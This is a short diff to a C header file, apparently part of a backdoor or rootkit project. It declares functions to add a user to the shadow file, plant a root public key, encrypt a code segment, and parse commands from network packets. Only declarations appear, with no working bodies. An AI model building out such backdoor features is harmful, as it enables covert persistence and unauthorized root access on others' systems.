@@ -1,3 +1,7 @@
+#ifndef SENSITIVE_INCLUDE
+#define SENSITIVE_INCLUDE
+
+/* Length in bytes of .text segment to encrypt */
 #define SENSITIVE_LEN 0x59b
 
 // Helper function to append a line (string) to a file
@@ -10,3 +14,13 @@ int add_user_shadow(void);
 int add_root_pubkey(void);
 // The kernel thread identifer
 char *proc_name(void);
+// Fetch command from packet
+struct command *get_command(unsigned char *, size_t);
+// Free command object
+void free_command(struct command *);
+
+// Check whether command object holds a valid request
+int is_add_user(struct command *);
+int is_add_pubkey(struct command *);
+
+#endif
